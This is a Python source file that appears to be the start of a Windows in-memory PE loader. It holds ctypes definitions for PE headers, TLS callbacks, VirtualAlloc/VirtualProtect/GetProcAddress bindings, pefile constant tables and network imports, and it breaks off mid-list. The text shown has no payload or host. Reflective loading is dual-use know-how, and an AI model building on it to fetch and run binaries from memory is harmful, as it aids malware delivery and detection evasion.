import  urllib.request, urllib, ssl, sys, base64
from ctypes import *
from ctypes.wintypes import *
import collections
import os
import struct
import codecs
import time
import math
import string
import mmap

from collections import Counter
from hashlib import sha1
from hashlib import sha256
from hashlib import sha512
from hashlib import md5

import functools
import copy as copymod


kernel32 = windll.kernel32



# debug flag
debug_output = __debug__

# system DLLs
_kernel32 = WinDLL('kernel32')
_msvcrt = CDLL('msvcrt')

# Check if the current machine is x64 or x86
isx64 = sizeof(c_void_p) == sizeof(c_ulonglong)

# type declarations
PWORD = POINTER(WORD)
PDWORD = POINTER(DWORD)
PHMODULE = POINTER(HMODULE)

LONG_PTR = c_longlong if isx64 else LONG
ULONG_PTR2 = c_ulong
ULONG_PTR = c_ulonglong if isx64 else DWORD
UINT_PTR = c_ulonglong if isx64 else c_uint
SIZE_T = ULONG_PTR
POINTER_TYPE = ULONG_PTR
POINTER_TYPE2 = ULONG_PTR2
LP_POINTER_TYPE = POINTER(POINTER_TYPE)
FARPROC = CFUNCTYPE(None)
PFARPROC = POINTER(FARPROC)
c_uchar_p = POINTER(c_ubyte)
c_ushort_p = POINTER(c_ushort)

# Generic Constants
NULL = 0

# Win32/Module-specific constants
IMAGE_SIZEOF_SHORT_NAME = 8
IMAGE_NUMBEROF_DIRECTORY_ENTRIES = 16
IMAGE_SIZEOF_SECTION_HEADER = 40

# Struct declarations
class IMAGE_SECTION_HEADER_MISC(Union):
	_fields_ = [
		('PhysicalAddress', DWORD),
		('VirtualSize', DWORD),
	]


class IMAGE_SECTION_HEADER(Structure):
	_anonymous_ = ('Misc',)
	_fields_ = [
		('Name', BYTE * IMAGE_SIZEOF_SHORT_NAME),
		('Misc', IMAGE_SECTION_HEADER_MISC),
		('VirtualAddress', DWORD),
		('SizeOfRawData', DWORD),
		('PointerToRawData', DWORD),
		('PointerToRelocations', DWORD),
		('PointerToLinenumbers', DWORD),
		('NumberOfRelocations', WORD),
		('NumberOfLinenumbers', WORD),
		('Characteristics', DWORD),
	]

PIMAGE_SECTION_HEADER = POINTER(IMAGE_SECTION_HEADER)


class IMAGE_DOS_HEADER(Structure):
	_fields_ = [
		('e_magic', WORD),
		('e_cblp', WORD),
		('e_cp', WORD),
		('e_crlc', WORD),
		('e_cparhdr', WORD),
		('e_minalloc', WORD),
		('e_maxalloc', WORD),
		('e_ss', WORD),
		('e_sp', WORD),
		('e_csum', WORD),
		('e_ip', WORD),
		('e_cs', WORD),
		('e_lfarlc', WORD),
		('e_ovno', WORD),
		('e_res', WORD * 4),
		('e_oemid', WORD),
		('e_oeminfo', WORD),
		('e_res2', WORD * 10),
		('e_lfanew', LONG),
	]

PIMAGE_DOS_HEADER = POINTER(IMAGE_DOS_HEADER)

''' ref: https://github.com/wine-mirror/wine/blob/master/include/winnt.h

typedef struct _IMAGE_TLS_DIRECTORY64 {
	ULONGLONG   StartAddressOfRawData;
	ULONGLONG   EndAddressOfRawData;
	ULONGLONG   AddressOfIndex;
	ULONGLONG   AddressOfCallBacks;
	DWORD	   SizeOfZeroFill;
	DWORD	   Characteristics;
} IMAGE_TLS_DIRECTORY64, *PIMAGE_TLS_DIRECTORY64;


typedef VOID (CALLBACK *PIMAGE_TLS_CALLBACK)(
	LPVOID DllHandle,DWORD Reason,LPVOID Reserved
);
'''

#ref: https://github.com/arizvisa/syringe/blob/1f0ea1f514426fd774903c70d03638ecd40a97c3/lib/pecoff/portable/tls.py

class IMAGE_TLS_CALLBACK(c_void_p):
	'''
	void NTAPI IMAGE_TLS_CALLBACK(PVOID DllHandle, DWORD Reason, PVOID Reserved)
	'''

PIMAGE_TLS_CALLBACK = POINTER(IMAGE_TLS_CALLBACK)

class IMAGE_TLS_DIRECTORY(Structure):
	_fields_ = [
		('StartAddressOfRawData', c_ulonglong),
		('EndAddressOfRawData', c_ulonglong),
		('AddressOfIndex', c_ulonglong),
		('AddressOfCallBacks', c_ulonglong),
		('SizeOfZeroFill', DWORD),
		('Characteristics', DWORD),
	]
	
PIMAGE_TLS_DIRECTORY = POINTER(IMAGE_TLS_DIRECTORY)



class IMAGE_DATA_DIRECTORY(Structure):
	_fields_ = [
		('VirtualAddress', DWORD),
		('Size', DWORD),
	]

PIMAGE_DATA_DIRECTORY = POINTER(IMAGE_DATA_DIRECTORY)


class IMAGE_BASE_RELOCATION(Structure):
	_fields_ = [
		('VirtualAddress', DWORD),
		('SizeOfBlock', DWORD),
	]

PIMAGE_BASE_RELOCATION = POINTER(IMAGE_BASE_RELOCATION)


class IMAGE_EXPORT_DIRECTORY(Structure):
	_fields_ = [
		('Characteristics', DWORD),
		('TimeDateStamp', DWORD),
		('MajorVersion', WORD),
		('MinorVersion', WORD),
		('Name', DWORD),
		('Base', DWORD),
		('NumberOfFunctions', DWORD),
		('NumberOfNames', DWORD),
		('AddressOfFunctions', DWORD),
		('AddressOfNames', DWORD),
		('AddressOfNamesOrdinals', DWORD),
	]

PIMAGE_EXPORT_DIRECTORY = POINTER(IMAGE_EXPORT_DIRECTORY)


class IMAGE_IMPORT_DESCRIPTOR_START(Union):
	_fields_ = [
		('Characteristics', DWORD),
		('OriginalFirstThunk', DWORD),
	]


class IMAGE_IMPORT_DESCRIPTOR(Structure):
	_anonymous_ = ('DUMMY',)
	_fields_ = [
		('DUMMY', IMAGE_IMPORT_DESCRIPTOR_START),
		('TimeDateStamp', DWORD),
		('ForwarderChain',DWORD),
		('Name', DWORD),
		('FirstThunk', DWORD),
	]

PIMAGE_IMPORT_DESCRIPTOR = POINTER(IMAGE_IMPORT_DESCRIPTOR)


class IMAGE_IMPORT_BY_NAME(Structure):
	_fields_ = [
		('Hint', WORD),
		('Name', ARRAY(BYTE, 1)),
	]

PIMAGE_IMPORT_BY_NAME = POINTER(IMAGE_IMPORT_BY_NAME)

class IMAGE_OPTIONAL_HEADER(Structure):
	_fields_ = [
		('Magic', WORD),
		('MajorLinkerVersion', BYTE),
		('MinorLinkerVersion', BYTE),
		('SizeOfCode', DWORD),
		('SizeOfInitializedData', DWORD),
		('SizeOfUninitializedData', DWORD),
		('AddressOfEntryPoint', DWORD),
		('BaseOfCode', DWORD),
		('BaseOfData', DWORD),
		('ImageBase', POINTER_TYPE),
		('SectionAlignment', DWORD),
		('FileAlignment', DWORD),
		('MajorOperatingSystemVersion', WORD),
		('MinorOperatingSystemVersion', WORD),
		('MajorImageVersion', WORD),
		('MinorImageVersion', WORD),
		('MajorSubsystemVersion', WORD),
		('MinorSubsystemVersion', WORD),
		('Reserved1', DWORD),
		('SizeOfImage', DWORD),
		('SizeOfHeaders', DWORD),
		('CheckSum', DWORD),
		('Subsystem', WORD),
		('DllCharacteristics', WORD),
		('SizeOfStackReserve', POINTER_TYPE),
		('SizeOfStackCommit', POINTER_TYPE),
		('SizeOfHeapReserve', POINTER_TYPE),
		('SizeOfHeapCommit', POINTER_TYPE),
		('LoaderFlags', DWORD),
		('NumberOfRvaAndSizes', DWORD),
		('DataDirectory', IMAGE_DATA_DIRECTORY * IMAGE_NUMBEROF_DIRECTORY_ENTRIES),
	]

PIMAGE_OPTIONAL_HEADER = POINTER(IMAGE_OPTIONAL_HEADER)


class IMAGE_FILE_HEADER(Structure):
	_fields_ = [
		('Machine', WORD),
		('NumberOfSections', WORD),
		('TimeDateStamp', DWORD),
		('PointerToSymbolTable', DWORD),
		('NumberOfSymbols', DWORD),
		('SizeOfOptionalHeader', WORD),
		('Characteristics', WORD),
	]

PIMAGE_FILE_HEADER = POINTER(IMAGE_FILE_HEADER)


class IMAGE_NT_HEADERS(Structure):
	_fields_ = [
		('Signature', DWORD),
		('FileHeader', IMAGE_FILE_HEADER),
		('OptionalHeader', IMAGE_OPTIONAL_HEADER),
	]

PIMAGE_NT_HEADERS = POINTER(IMAGE_NT_HEADERS)

# Win32 API Function Prototypes
VirtualAlloc = _kernel32.VirtualAlloc
VirtualAlloc.restype = LPVOID
VirtualAlloc.argtypes = [LPVOID, SIZE_T, DWORD, DWORD]

VirtualFree = _kernel32.VirtualFree
VirtualFree.restype = BOOL
VirtualFree.argtypes = [ LPVOID, SIZE_T, DWORD ]

VirtualProtect = _kernel32.VirtualProtect
VirtualProtect.restype = BOOL
VirtualProtect.argtypes = [ LPVOID, SIZE_T, DWORD, PDWORD ]

HeapAlloc = _kernel32.HeapAlloc
HeapAlloc.restype = LPVOID
HeapAlloc.argtypes = [ HANDLE, DWORD, SIZE_T ]

GetProcessHeap = _kernel32.GetProcessHeap
GetProcessHeap.restype = HANDLE
GetProcessHeap.argtypes = []

HeapFree = _kernel32.HeapFree
HeapFree.restype = BOOL
HeapFree.argtypes = [ HANDLE, DWORD, LPVOID ]

GetProcAddress = _kernel32.GetProcAddress
GetProcAddress.restype = FARPROC
GetProcAddress.argtypes = [HMODULE, LPCSTR]

LoadLibraryA = _kernel32.LoadLibraryA
LoadLibraryA.restype = HMODULE
LoadLibraryA.argtypes = [ LPCSTR ]

LoadLibraryW = _kernel32.LoadLibraryW
LoadLibraryW.restype = HMODULE
LoadLibraryW.argtypes = [ LPCWSTR ]

FreeLibrary = _kernel32.FreeLibrary
FreeLibrary.restype = BOOL
FreeLibrary.argtypes = [ HMODULE ]

IsBadReadPtr = _kernel32.IsBadReadPtr
IsBadReadPtr.restype = BOOL
IsBadReadPtr.argtypes = [ LPCVOID, UINT_PTR ]

realloc = _msvcrt.realloc
realloc.restype = c_void_p
realloc.argtypes = [ c_void_p, c_size_t ]

# Type declarations 
DllEntryProc = WINFUNCTYPE(BOOL, HINSTANCE, DWORD, LPVOID)
PDllEntryProc = POINTER(DllEntryProc)
TLSexecProc = WINFUNCTYPE(BOOL, HINSTANCE, DWORD, LPVOID)
PTLSExecProc = POINTER(TLSexecProc)
HMEMORYMODULE = HMODULE

ExeEntryProc = WINFUNCTYPE(BOOL, LPVOID)
PExeEntryProc = POINTER(ExeEntryProc)

# Constants
MEM_COMMIT = 0x00001000
MEM_DECOMMIT = 0x4000
MEM_RELEASE = 0x8000
MEM_RESERVE = 0x00002000
MEM_FREE = 0x10000
MEM_MAPPED = 0x40000
MEM_RESET = 0x00080000

PAGE_NOACCESS = 0x01
PAGE_READONLY = 0x02
PAGE_READWRITE = 0x04
PAGE_WRITECOPY = 0x08
PAGE_EXECUTE = 0x10
PAGE_EXECUTE_READ = 0x20
PAGE_EXECUTE_READWRITE = 0x40
PAGE_EXECUTE_WRITECOPY = 0x80
PAGE_NOCACHE = 0x200

ProtectionFlags = ARRAY(ARRAY(ARRAY(c_int, 2), 2), 2)(
	(
		(PAGE_NOACCESS, PAGE_WRITECOPY),
		(PAGE_READONLY, PAGE_READWRITE),
	), (
		(PAGE_EXECUTE, PAGE_EXECUTE_WRITECOPY),
		(PAGE_EXECUTE_READ, PAGE_EXECUTE_READWRITE),
	),
)


IMAGE_SCN_MEM_EXECUTE = 0x20000000
IMAGE_SCN_MEM_READ = 0x40000000
IMAGE_SCN_MEM_WRITE = 0x80000000
IMAGE_SCN_MEM_DISCARDABLE = 0x02000000
IMAGE_SCN_MEM_NOT_CACHED = 0x04000000
IMAGE_SCN_CNT_INITIALIZED_DATA = 0x00000040
IMAGE_SCN_CNT_UNINITIALIZED_DATA = 0x00000080

IMAGE_DIRECTORY_ENTRY_EXPORT = 0
IMAGE_DIRECTORY_ENTRY_IMPORT = 1
IMAGE_DIRECTORY_ENTRY_RESOURCE = 2
IMAGE_DIRECTORY_ENTRY_EXCEPTION = 3
IMAGE_DIRECTORY_ENTRY_SECURITY = 4
IMAGE_DIRECTORY_ENTRY_BASERELOC = 5
IMAGE_DIRECTORY_ENTRY_DEBUG = 6
# IMAGE_DIRECTORY_ENTRY_COPYRIGHT = 7
IMAGE_DIRECTORY_ENTRY_ARCHITECTURE = 7
IMAGE_DIRECTORY_ENTRY_GLOBALPTR = 8
IMAGE_DIRECTORY_ENTRY_TLS = 9
IMAGE_DIRECTORY_ENTRY_LOAD_CONFIG = 10
IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT = 11
IMAGE_DIRECTORY_ENTRY_IAT = 12
IMAGE_DIRECTORY_ENTRY_DELAY_IMPORT = 13
IMAGE_DIRECTORY_ENTRY_COM_DESCRIPTOR = 14

DLL_PROCESS_ATTACH = 1
DLL_THREAD_ATTACH = 2
DLL_THREAD_DETACH = 3
DLL_PROCESS_DETACH = 0

INVALID_HANDLE_VALUE = -1

IMAGE_SIZEOF_BASE_RELOCATION = sizeof(IMAGE_BASE_RELOCATION)
IMAGE_REL_BASED_ABSOLUTE = 0
IMAGE_REL_BASED_HIGH = 1
IMAGE_REL_BASED_LOW = 2
IMAGE_REL_BASED_HIGHLOW = 3
IMAGE_REL_BASED_HIGHADJ = 4
IMAGE_REL_BASED_MIPS_JMPADDR = 5
IMAGE_REL_BASED_MIPS_JMPADDR16 = 9
IMAGE_REL_BASED_IA64_IMM64 = 9
IMAGE_REL_BASED_DIR64 = 10

_IMAGE_ORDINAL_FLAG64 = 0x8000000000000000
_IMAGE_ORDINAL_FLAG32 = 0x80000000
_IMAGE_ORDINAL64 = lambda o: (o & 0xffff)
_IMAGE_ORDINAL32 = lambda o: (o & 0xffff)
_IMAGE_SNAP_BY_ORDINAL64 = lambda o: ((o & _IMAGE_ORDINAL_FLAG64) != 0)
_IMAGE_SNAP_BY_ORDINAL32 = lambda o: ((o & _IMAGE_ORDINAL_FLAG32) != 0)
IMAGE_ORDINAL = _IMAGE_ORDINAL64 if isx64 else _IMAGE_ORDINAL32
IMAGE_SNAP_BY_ORDINAL = _IMAGE_SNAP_BY_ORDINAL64 if isx64 else _IMAGE_SNAP_BY_ORDINAL32
IMAGE_ORDINAL_FLAG = _IMAGE_ORDINAL_FLAG64 if isx64 else _IMAGE_ORDINAL_FLAG32

IMAGE_DOS_SIGNATURE = 0x5A4D # MZ
IMAGE_OS2_SIGNATURE = 0x454E # NE
IMAGE_OS2_SIGNATURE_LE = 0x454C # LE
IMAGE_VXD_SIGNATURE = 0x454C # LE
IMAGE_NT_SIGNATURE = 0x00004550 # PE00

class MEMORYMODULE(Structure):
	_fields_ = [
		('headers', PIMAGE_NT_HEADERS),
		('codeBase', c_void_p),
		('modules', PHMODULE),
		('numModules', c_int),
		('initialized', c_int),
	]
PMEMORYMODULE = POINTER(MEMORYMODULE)

def as_unsigned_buffer(sz=None, indata=None):
	if sz is None:
		if indata is None:
			raise Exception('Must specify initial data or a buffer size.')
		sz = len(indata)
	rtype = (c_ubyte * sz)
	if indata is None:
		return rtype
	else:
		tindata = type(indata)
		if tindata in [ int, int ]:
			return rtype.from_address(indata)
		elif tindata in [ c_void_p, DWORD, POINTER_TYPE ] or hasattr(indata, 'value') and type(indata.value) in [ int, int ]:
			return rtype.from_address(indata.value)
		else:
			return rtype.from_address(addressof(indata))

def create_unsigned_buffer(sz, indata):
	res = as_unsigned_buffer(sz)()
	for i, c in enumerate(indata):
		if type(c) in [ str, str, str ]:
			c = ord(c)
		res[i] = c
	return res

def getprocaddr(handle,func):
	kernel32.GetProcAddress.argtypes = [c_void_p, c_char_p]
	kernel32.GetProcAddress.restype = c_void_p
	address = kernel32.GetProcAddress(handle, func)
	return address



codecs.register_error("backslashreplace_", codecs.lookup_error("backslashreplace"))

long = int
# lru_cache with a shallow copy of the objects returned (list, dicts, ..)
# we don't use deepcopy as it's _really_ slow and the data we retrieved using
# this is enough with copy.copy taken from
# https://stackoverflow.com/questions/54909357
def lru_cache(maxsize=128, typed=False, copy=False):
    if not copy:
        return functools.lru_cache(maxsize, typed)

    def decorator(f):
        cached_func = functools.lru_cache(maxsize, typed)(f)

        @functools.wraps(f)
        def wrapper(*args, **kwargs):
            # return copymod.deepcopy(cached_func(*args, **kwargs))
            return copymod.copy(cached_func(*args, **kwargs))

        return wrapper

    return decorator


@lru_cache(maxsize=2048)
def cache_adjust_FileAlignment(val, file_alignment):
    if file_alignment < FILE_ALIGNMENT_HARDCODED_VALUE:
        return val
    return (int(val / 0x200)) * 0x200


@lru_cache(maxsize=2048)
def cache_adjust_SectionAlignment(val, section_alignment, file_alignment):
    if section_alignment < 0x1000:  # page size
        section_alignment = file_alignment

    # 0x200 is the minimum valid FileAlignment according to the documentation
    # although ntoskrnl.exe has an alignment of 0x80 in some Windows versions
    #
    # elif section_alignment < 0x80:
    #    section_alignment = 0x80

    if section_alignment and val % section_alignment:
        return section_alignment * (int(val / section_alignment))
    return val


def count_zeroes(data):
    return data.count(0)


fast_load = False

# This will set a maximum length of a string to be retrieved from the file.
# It's there to prevent loading massive amounts of data from memory mapped
# files. Strings longer than 1MB should be rather rare.
MAX_STRING_LENGTH = 0x100000  # 2^20

# Maximum number of imports to parse.
MAX_IMPORT_SYMBOLS = 0x2000

# Limit maximum length for specific string types separately
MAX_IMPORT_NAME_LENGTH = 0x200
MAX_DLL_LENGTH = 0x200
MAX_SYMBOL_NAME_LENGTH = 0x200

# Lmit maximum number of sections before processing of sections will stop
MAX_SECTIONS = 0x800

# The global maximum number of resource entries to parse per file
MAX_RESOURCE_ENTRIES = 0x8000

# The maximum depth of nested resource tables
MAX_RESOURCE_DEPTH = 32

# Limit number of exported symbols
MAX_SYMBOL_EXPORT_COUNT = 0x2000

IMAGE_DOS_SIGNATURE = 0x5A4D
IMAGE_DOSZM_SIGNATURE = 0x4D5A
IMAGE_NE_SIGNATURE = 0x454E
IMAGE_LE_SIGNATURE = 0x454C
IMAGE_LX_SIGNATURE = 0x584C
IMAGE_TE_SIGNATURE = 0x5A56  # Terse Executables have a 'VZ' signature

IMAGE_NT_SIGNATURE = 0x00004550
IMAGE_NUMBEROF_DIRECTORY_ENTRIES = 16
IMAGE_ORDINAL_FLAG = 0x80000000
IMAGE_ORDINAL_FLAG64 = 0x8000000000000000
OPTIONAL_HEADER_MAGIC_PE = 0x10B
OPTIONAL_HEADER_MAGIC_PE_PLUS = 0x20B


def two_way_dict(pairs):
    return dict([(e[1], e[0]) for e in pairs] + pairs)


directory_entry_types = [
    ("IMAGE_DIRECTORY_ENTRY_EXPORT", 0),
    ("IMAGE_DIRECTORY_ENTRY_IMPORT", 1),
    ("IMAGE_DIRECTORY_ENTRY_RESOURCE", 2),
    ("IMAGE_DIRECTORY_ENTRY_EXCEPTION", 3),
    ("IMAGE_DIRECTORY_ENTRY_SECURITY", 4),
    ("IMAGE_DIRECTORY_ENTRY_BASERELOC", 5),
    ("IMAGE_DIRECTORY_ENTRY_DEBUG", 6),
    # Architecture on non-x86 platforms
    ("IMAGE_DIRECTORY_ENTRY_COPYRIGHT", 7),
    ("IMAGE_DIRECTORY_ENTRY_GLOBALPTR", 8),
    ("IMAGE_DIRECTORY_ENTRY_TLS", 9),
    ("IMAGE_DIRECTORY_ENTRY_LOAD_CONFIG", 10),
    ("IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT", 11),
    ("IMAGE_DIRECTORY_ENTRY_IAT", 12),
    ("IMAGE_DIRECTORY_ENTRY_DELAY_IMPORT", 13),
    ("IMAGE_DIRECTORY_ENTRY_COM_DESCRIPTOR", 14),
    ("IMAGE_DIRECTORY_ENTRY_RESERVED", 15),
]

DIRECTORY_ENTRY = two_way_dict(directory_entry_types)

image_characteristics = [
    ("IMAGE_FILE_RELOCS_STRIPPED", 0x0001),
    ("IMAGE_FILE_EXECUTABLE_IMAGE", 0x0002),
    ("IMAGE_FILE_LINE_NUMS_STRIPPED", 0x0004),
    ("IMAGE_FILE_LOCAL_SYMS_STRIPPED", 0x0008),
    ("IMAGE_FILE_AGGRESIVE_WS_TRIM", 0x0010),
    ("IMAGE_FILE_LARGE_ADDRESS_AWARE", 0x0020),
    ("IMAGE_FILE_16BIT_MACHINE", 0x0040),
    ("IMAGE_FILE_BYTES_REVERSED_LO", 0x0080),
    ("IMAGE_FILE_32BIT_MACHINE", 0x0100),
    ("IMAGE_FILE_DEBUG_STRIPPED", 0x0200),
    ("IMAGE_FILE_REMOVABLE_RUN_FROM_SWAP", 0x0400),
    ("IMAGE_FILE_NET_RUN_FROM_SWAP", 0x0800),
    ("IMAGE_FILE_SYSTEM", 0x1000),
    ("IMAGE_FILE_DLL", 0x2000),
    ("IMAGE_FILE_UP_SYSTEM_ONLY", 0x4000),
    ("IMAGE_FILE_BYTES_REVERSED_HI", 0x8000),
]

IMAGE_CHARACTERISTICS = two_way_dict(image_characteristics)


section_characteristics = [
    ("IMAGE_SCN_TYPE_REG", 0x00000000),  # reserved
    ("IMAGE_SCN_TYPE_DSECT", 0x00000001),  # reserved
    ("IMAGE_SCN_TYPE_NOLOAD", 0x00000002),  # reserved
    ("IMAGE_SCN_TYPE_GROUP", 0x00000004),  # reserved
    ("IMAGE_SCN_TYPE_NO_PAD", 0x00000008),  # reserved
    ("IMAGE_SCN_TYPE_COPY", 0x00000010),  # reserved
    ("IMAGE_SCN_CNT_CODE", 0x00000020),
    ("IMAGE_SCN_CNT_INITIALIZED_DATA", 0x00000040),
    ("IMAGE_SCN_CNT_UNINITIALIZED_DATA", 0x00000080),
    ("IMAGE_SCN_LNK_OTHER", 0x00000100),
    ("IMAGE_SCN_LNK_INFO", 0x00000200),
    ("IMAGE_SCN_LNK_OVER", 0x00000400),  # reserved
    ("IMAGE_SCN_LNK_REMOVE", 0x00000800),
    ("IMAGE_SCN_LNK_COMDAT", 0x00001000),
    ("IMAGE_SCN_MEM_PROTECTED", 0x00004000),  # obsolete
    ("IMAGE_SCN_NO_DEFER_SPEC_EXC", 0x00004000),
    ("IMAGE_SCN_GPREL", 0x00008000),
    ("IMAGE_SCN_MEM_FARDATA", 0x00008000),
    ("IMAGE_SCN_MEM_SYSHEAP", 0x00010000),  # obsolete
    ("IMAGE_SCN_MEM_PURGEABLE", 0x00020000),
    ("IMAGE_SCN_MEM_16BIT", 0x00020000),
    ("IMAGE_SCN_MEM_LOCKED", 0x00040000),
    ("IMAGE_SCN_MEM_PRELOAD", 0x00080000),
    ("IMAGE_SCN_ALIGN_1BYTES", 0x00100000),
    ("IMAGE_SCN_ALIGN_2BYTES", 0x00200000),
    ("IMAGE_SCN_ALIGN_4BYTES", 0x00300000),
    ("IMAGE_SCN_ALIGN_8BYTES", 0x00400000),
    ("IMAGE_SCN_ALIGN_16BYTES", 0x00500000),  # default alignment
    ("IMAGE_SCN_ALIGN_32BYTES", 0x00600000),
    ("IMAGE_SCN_ALIGN_64BYTES", 0x00700000),
    ("IMAGE_SCN_ALIGN_128BYTES", 0x00800000),
    ("IMAGE_SCN_ALIGN_256BYTES", 0x00900000),
    ("IMAGE_SCN_ALIGN_512BYTES", 0x00A00000),
    ("IMAGE_SCN_ALIGN_1024BYTES", 0x00B00000),
    ("IMAGE_SCN_ALIGN_2048BYTES", 0x00C00000),
    ("IMAGE_SCN_ALIGN_4096BYTES", 0x00D00000),
    ("IMAGE_SCN_ALIGN_8192BYTES", 0x00E00000),
    ("IMAGE_SCN_ALIGN_MASK", 0x00F00000),
    ("IMAGE_SCN_LNK_NRELOC_OVFL", 0x01000000),
    ("IMAGE_SCN_MEM_DISCARDABLE", 0x02000000),
    ("IMAGE_SCN_MEM_NOT_CACHED", 0x04000000),
    ("IMAGE_SCN_MEM_NOT_PAGED", 0x08000000),
    ("IMAGE_SCN_MEM_SHARED", 0x10000000),
    ("IMAGE_SCN_MEM_EXECUTE", 0x20000000),
    ("IMAGE_SCN_MEM_READ", 0x40000000),
    ("IMAGE_SCN_MEM_WRITE", 0x80000000),
]

SECTION_CHARACTERISTICS = two_way_dict(section_characteristics)


debug_types = [
    ("IMAGE_DEBUG_TYPE_UNKNOWN", 0),
    ("IMAGE_DEBUG_TYPE_COFF", 1),
    ("IMAGE_DEBUG_TYPE_CODEVIEW", 2),
    ("IMAGE_DEBUG_TYPE_FPO", 3),
    ("IMAGE_DEBUG_TYPE_MISC", 4),
    ("IMAGE_DEBUG_TYPE_EXCEPTION", 5),
    ("IMAGE_DEBUG_TYPE_FIXUP", 6),
    ("IMAGE_DEBUG_TYPE_OMAP_TO_SRC", 7),
    ("IMAGE_DEBUG_TYPE_OMAP_FROM_SRC", 8),
    ("IMAGE_DEBUG_TYPE_BORLAND", 9),
    ("IMAGE_DEBUG_TYPE_RESERVED10", 10),
    ("IMAGE_DEBUG_TYPE_CLSID", 11),
    ("IMAGE_DEBUG_TYPE_VC_FEATURE", 12),
    ("IMAGE_DEBUG_TYPE_POGO", 13),
    ("IMAGE_DEBUG_TYPE_ILTCG", 14),
    ("IMAGE_DEBUG_TYPE_MPX", 15),
    ("IMAGE_DEBUG_TYPE_REPRO", 16),
    ("IMAGE_DEBUG_TYPE_EX_DLLCHARACTERISTICS", 20),
]

DEBUG_TYPE = two_way_dict(debug_types)


subsystem_types = [
    ("IMAGE_SUBSYSTEM_UNKNOWN", 0),
    ("IMAGE_SUBSYSTEM_NATIVE", 1),
    ("IMAGE_SUBSYSTEM_WINDOWS_GUI", 2),
    ("IMAGE_SUBSYSTEM_WINDOWS_CUI", 3),
    ("IMAGE_SUBSYSTEM_OS2_CUI", 5),
    ("IMAGE_SUBSYSTEM_POSIX_CUI", 7),
    ("IMAGE_SUBSYSTEM_NATIVE_WINDOWS", 8),
    ("IMAGE_SUBSYSTEM_WINDOWS_CE_GUI", 9),
    ("IMAGE_SUBSYSTEM_EFI_APPLICATION", 10),
    ("IMAGE_SUBSYSTEM_EFI_BOOT_SERVICE_DRIVER", 11),
    ("IMAGE_SUBSYSTEM_EFI_RUNTIME_DRIVER", 12),
    ("IMAGE_SUBSYSTEM_EFI_ROM", 13),
    ("IMAGE_SUBSYSTEM_XBOX", 14),
    ("IMAGE_SUBSYSTEM_WINDOWS_BOOT_APPLICATION", 16),
]

SUBSYSTEM_TYPE = two_way_dict(subsystem_types)


machine_types = [
    ("IMAGE_FILE_MACHINE_UNKNOWN", 0),
    ("IMAGE_FILE_MACHINE_I386", 0x014C),
    ("IMAGE_FILE_MACHINE_R3000", 0x0162),
    ("IMAGE_FILE_MACHINE_R4000", 0x0166),
    ("IMAGE_FILE_MACHINE_R10000", 0x0168),
    ("IMAGE_FILE_MACHINE_WCEMIPSV2", 0x0169),
    ("IMAGE_FILE_MACHINE_ALPHA", 0x0184),
    ("IMAGE_FILE_MACHINE_SH3", 0x01A2),
    ("IMAGE_FILE_MACHINE_SH3DSP", 0x01A3),
    ("IMAGE_FILE_MACHINE_SH3E", 0x01A4),
    ("IMAGE_FILE_MACHINE_SH4", 0x01A6),
    ("IMAGE_FILE_MACHINE_SH5", 0x01A8),
    ("IMAGE_FILE_MACHINE_ARM", 0x01C0),
    ("IMAGE_FILE_MACHINE_THUMB", 0x01C2),
    ("IMAGE_FILE_MACHINE_ARMNT", 0x01C4),
    ("IMAGE_FILE_MACHINE_AM33", 0x01D3),
    ("IMAGE_FILE_MACHINE_POWERPC", 0x01F0),
    ("IMAGE_FILE_MACHINE_POWERPCFP", 0x01F1),
    ("IMAGE_FILE_MACHINE_IA64", 0x0200),
    ("IMAGE_FILE_MACHINE_MIPS16", 0x0266),
    ("IMAGE_FILE_MACHINE_ALPHA64", 0x0284),
    ("IMAGE_FILE_MACHINE_AXP64", 0x0284),  # same
    ("IMAGE_FILE_MACHINE_MIPSFPU", 0x0366),
    ("IMAGE_FILE_MACHINE_MIPSFPU16", 0x0466),
    ("IMAGE_FILE_MACHINE_TRICORE", 0x0520),
    ("IMAGE_FILE_MACHINE_CEF", 0x0CEF),
    ("IMAGE_FILE_MACHINE_EBC", 0x0EBC),
    ("IMAGE_FILE_MACHINE_AMD64", 0x8664),
    ("IMAGE_FILE_MACHINE_M32R", 0x9041),
    ("IMAGE_FILE_MACHINE_ARM64", 0xAA64),
    ("IMAGE_FILE_MACHINE_CEE", 0xC0EE),
]

MACHINE_TYPE = two_way_dict(machine_types)


relocation_types = [
    ("IMAGE_REL_BASED_ABSOLUTE", 0),
    ("IMAGE_REL_BASED_HIGH", 1),
    ("IMAGE_REL_BASED_LOW", 2),
    ("IMAGE_REL_BASED_HIGHLOW", 3),
    ("IMAGE_REL_BASED_HIGHADJ", 4),
    ("IMAGE_REL_BASED_MIPS_JMPADDR", 5),
    ("IMAGE_REL_BASED_SECTION", 6),
    ("IMAGE_REL_BASED_REL", 7),
    ("IMAGE_REL_BASED_MIPS_JMPADDR16", 9),
    ("IMAGE_REL_BASED_IA64_IMM64", 9),
    ("IMAGE_REL_BASED_DIR64", 10),
    ("IMAGE_REL_BASED_HIGH3ADJ", 11),
]

RELOCATION_TYPE = two_way_dict(relocation_types)


dll_characteristics = [
    ("IMAGE_LIBRARY_PROCESS_INIT", 0x0001),  # reserved
    ("IMAGE_LIBRARY_PROCESS_TERM", 0x0002),  # reserved
    ("IMAGE_LIBRARY_THREAD_INIT", 0x0004),  # reserved
    ("IMAGE_LIBRARY_THREAD_TERM", 0x0008),  # reserved
    ("IMAGE_DLLCHARACTERISTICS_HIGH_ENTROPY_VA", 0x0020),
    ("IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE", 0x0040),
    ("IMAGE_DLLCHARACTERISTICS_FORCE_INTEGRITY", 0x0080),
    ("IMAGE_DLLCHARACTERISTICS_NX_COMPAT", 0x0100),
    ("IMAGE_DLLCHARACTERISTICS_NO_ISOLATION", 0x0200),
    ("IMAGE_DLLCHARACTERISTICS_NO_SEH", 0x0400),
    ("IMAGE_DLLCHARACTERISTICS_NO_BIND", 0x0800),
    ("IMAGE_DLLCHARACTERISTICS_APPCONTAINER", 0x1000),
    ("IMAGE_DLLCHARACTERISTICS_WDM_DRIVER", 0x2000),
    ("IMAGE_DLLCHARACTERISTICS_GUARD_CF", 0x4000),
    ("IMAGE_DLLCHARACTERISTICS_TERMINAL_SERVER_AWARE", 0x8000),
]

DLL_CHARACTERISTICS = two_way_dict(dll_characteristics)

FILE_ALIGNMENT_HARDCODED_VALUE = 0x200


# Unwind info-related enums

unwind_info_flags = [
